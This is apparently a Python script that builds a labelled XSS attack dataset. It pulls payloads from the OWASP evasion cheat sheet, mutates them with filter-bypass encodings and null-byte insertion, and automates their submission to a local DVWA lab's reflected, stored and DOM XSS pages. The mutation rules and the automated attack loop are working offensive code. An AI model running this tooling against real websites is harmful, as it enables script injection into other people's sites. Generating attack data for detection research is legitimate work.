# build_and_capture_xss.py
# Windows-friendly: packet capture disabled by default, DVWA automation hardened
CAPTURE = False  # pcap 캡처 비활성화(Windows). 나중에 WinDump로 바꾸고 True로 전환 가능.

import re, html, time, csv, random, argparse, requests, urllib.parse
from pathlib import Path
from datetime import datetime
from playwright.sync_api import sync_playwright, TimeoutError as PwTimeout

BASE = "http://127.0.0.1:8080"
RAW_URL = ("https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/"
           "cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.md")

# ---------- 1) OWASP 페이로드 추출 ----------
PATTERNS = [
    r"<\s*script", r"javascript\s*:", r"on\w+\s*=", r"<\s*img", r"<\s*svg",
    r"<\s*iframe", r"<\s*meta", r"alert\s*\(", r"fromCharCode", r"data:text/html",
    r"expression\s*\(", r"vbscript\s*:", r"base64", r"<\s*body", r"<\s*link",
    r"<\s*style", r"<\s*object", r"<\s*embed", r"DYNSRC", r"LOWSRC"
]
RX = re.compile("|".join(PATTERNS), re.IGNORECASE)

def fetch_owasp_md():
    resp = requests.get(RAW_URL, timeout=30)
    resp.raise_for_status()
    return resp.text

def extract_payloads(md: str):
    pays = set()
    section = None
    for line in md.splitlines():
        if line.strip().startswith("#"):
            section = line.strip("# ").strip()
        cand = line.strip()
        if len(cand) < 4:
            continue
        if RX.search(cand):
            cand = html.unescape(cand).strip(" `")
            if 4 <= len(cand) <= 500:
                pays.add((cand, section or ""))
    items = sorted(list(pays))
    Path("xss_payloads.txt").write_text("\n".join([p for p, _ in items]), encoding="utf-8")
    with open("xss_payloads.csv","w",newline="",encoding="utf-8") as f:
        w=csv.writer(f); w.writerow(["payload","section"]); w.writerows(items)
    return [p for p,_ in items]

# ---------- 2) 변형(우회 규칙) ----------
random.seed(42)

def case_mix(s: str) -> str:
    return "".join(c.upper() if random.random()<0.5 else c.lower() for c in s)

def insert_null(s: str) -> str:
    i = s.lower().find("script")
    if i != -1:
        return s[:i+2] + "\0" + s[i+2:]
    if s:
        pos = random.randrange(1, len(s))
        return s[:pos] + "\0" + s[pos:]
    return s

def html_dec_partial(s: str) -> str:
    out=[]
    for c in s:
        out.append(f"&#{ord(c)}" if (c.isalpha() and random.random()<0.25) else c)
    return "".join(out)

def html_hex_partial(s: str) -> str:
    out=[]
    for c in s:
        out.append(f"&#x{ord(c):x}" if (c.isalpha() and random.random()<0.25) else c)
    return "".join(out)

def url_enc_partial(s: str) -> str:
    need = "<>\"'() ;:\n\r\t"
    return "".join(urllib.parse.quote(c) if (c in need or random.random()<0.1) else c for c in s)

RULES = [case_mix, insert_null, html_dec_partial, html_hex_partial, url_enc_partial]

def mutate_once(p: str, depth=2):
    s = p
    for _ in range(depth):
        s = random.choice(RULES)(s)
    return s

def augment(payloads, variants_per=2):
    out = set(payloads)
    for p in payloads:
        for _ in range(variants_per):
            out.add(mutate_once(p, depth=random.randint(1,3)))
    Path("xss_payloads_augmented.txt").write_text("\n".join(sorted(out)), encoding="utf-8")
    return sorted(out)

# ---------- 3) 캡처 (Windows에서는 비활성화 기본) ----------
def start_capture():
    # CAPTURE=False 이므로 더미 반환
    return None, None

def stop_capture(proc):
    return

# ---------- 4) DVWA 자동화 ----------
TARGETS = [
    ("/vulnerabilities/xss_r/", "reflected", "GET",  "name"),
    ("/vulnerabilities/xss_s/", "stored",    "POST", "mtxMessage"),
    ("/vulnerabilities/xss_d/", "dom",       "GET",  "default"),
]
SEC_LEVELS = ["low","medium","high"]

def dvwa_setup(page):
    # 최초 실행 시에만 "Create / Reset Database" 버튼이 존재
    page.goto(f"{BASE}/setup.php")
    try:
        btn = page.locator('input[type="submit"]')
        if btn.count() > 0:
            btn.first.click()
            page.wait_for_load_state("networkidle")
    except Exception:
        pass  # 이미 셋업된 경우 등

def login(page):
    page.goto(f"{BASE}/login.php")
    page.fill('input[name="username"]', "admin")
    page.fill('input[name="password"]', "password")
    page.click('input[type="submit"]')
    page.wait_for_load_state("networkidle")

def set_security(page, level):
    # 쿠키로 먼저 보안레벨 힌트 제공
    page.context.add_cookies([{"name":"security","value":level,"url":BASE}])
    page.goto(f"{BASE}/security.php")
    try:
        page.select_option('select[name="security"]', level)
        page.click('input[type="submit"]')
        page.wait_for_load_state("networkidle")
    except PwTimeout:
        # 요소가 없거나 이미 설정된 경우 무시
        pass
    except Exception:
        pass

def submit_reflected(page, field, payload):
    page.goto(f"{BASE}/vulnerabilities/xss_r/")
    page.fill(f'input[name="{field}"]', payload)
    page.click('input[type="submit"]')
    page.wait_for_load_state("networkidle")

def submit_stored(page, field, payload):
    # DVWA Stored XSS의 실제 필드/버튼 사용
    page.goto(f"{BASE}/vulnerabilities/xss_s/")
    page.fill('input[name="txtName"]', "tester")
    page.fill('textarea[name="mtxMessage"]', payload)
    page.click('input[name="btnSign"]')
    page.wait_for_load_state("networkidle")

def submit_dom(page, payload):
    # DOM XSS: 쿼리 파라미터로 전달 (특수문자 안전 인코딩)
    page.goto(f"{BASE}/vulnerabilities/xss_d/?default={urllib.parse.quote(payload, safe='')}")

def run_attacks(payloads, headless=True):
    log_csv = Path("attack_runs.csv")
    first = not log_csv.exists()
    with log_csv.open("a", newline="", encoding="utf-8") as f, sync_playwright() as p:
        browser = p.chromium.launch(headless=headless)
        ctx = browser.new_context()
        page = ctx.new_page()

        # 전역 타임아웃/다이얼로그 처리
        page.set_default_timeout(15000)
        page.on("dialog", lambda d: d.dismiss())

        # DVWA 초기화 & 로그인
        dvwa_setup(page)
        login(page)

        # 캡처 시작 (공격 세션만)
        proc, pcap = (None, None)
        if CAPTURE:
            proc, pcap = start_capture()

        try:
            w = csv.DictWriter(f, fieldnames=["t_epoch","t_iso","security","type","method","path","payload","label"])
            if first:
                w.writeheader()

            for sec in SEC_LEVELS:
                set_security(page, sec)
                for path, kind, method, field in TARGETS:
                    for payload in payloads:
                        ts = time.time()
                        try:
                            if kind=="reflected":
                                submit_reflected(page, field, payload)
                            elif kind=="stored":
                                submit_stored(page, field, payload)
                            else:
                                submit_dom(page, payload)
                        except Exception:
                            # 어떤 페이로드는 페이지 동작/렌더러 에러를 유발할 수 있으므로 스킵
                            continue
                        w.writerow({
                            "t_epoch": f"{ts:.6f}",
                            "t_iso": datetime.utcfromtimestamp(ts).isoformat()+"Z",
                            "security": sec, "type": kind, "method": method, "path": path,
                            "payload": payload, "label": "attack"
                        })
                        # 서버 과부하/차단 방지
                        time.sleep(0.03)
        finally:
            if CAPTURE and proc:
                stop_capture(proc)
            browser.close()
            if pcap:
                print(f"[+] captured: {pcap} (CAPTURE={CAPTURE})")
            print(f"[+] meta log : {log_csv}")

# ---------- main ----------
if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--variants_per_payload", type=int, default=2)
    ap.add_argument("--headless", type=int, default=1, help="1=headless, 0=headed")
    args = ap.parse_args()

    print("[1/3] Fetching OWASP cheat sheet & extracting payloads...")
    md = fetch_owasp_md()
    base_payloads = extract_payloads(md)

    print(f"[2/3] Augmenting (variants_per={args.variants_per_payload})...")
    payloads = augment(base_payloads, variants_per=args.variants_per_payload)

    print(f"[3/3] Running DVWA attacks & capturing packets...")
    run_attacks(payloads, headless=bool(args.headless))
